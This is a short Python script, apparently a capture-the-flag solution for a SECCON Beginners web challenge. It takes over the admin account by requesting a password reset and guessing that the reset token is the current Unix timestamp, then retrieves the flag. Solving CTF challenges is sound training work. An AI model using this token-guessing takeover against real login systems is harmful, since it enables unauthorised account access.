import time
import requests

session = requests.Session()

URL = "http://login4b.challenges.beginners.seccon.jp"

session.post(f"{URL}/api/reset-request", json={"username": "admin"})
token = int(time.time())
session.post(f"{URL}/api/reset-password", json={"username": "admin", "token": token, "newPassword": "satoki"})

response = session.get(f"{URL}/api/get_flag")
print(response.text)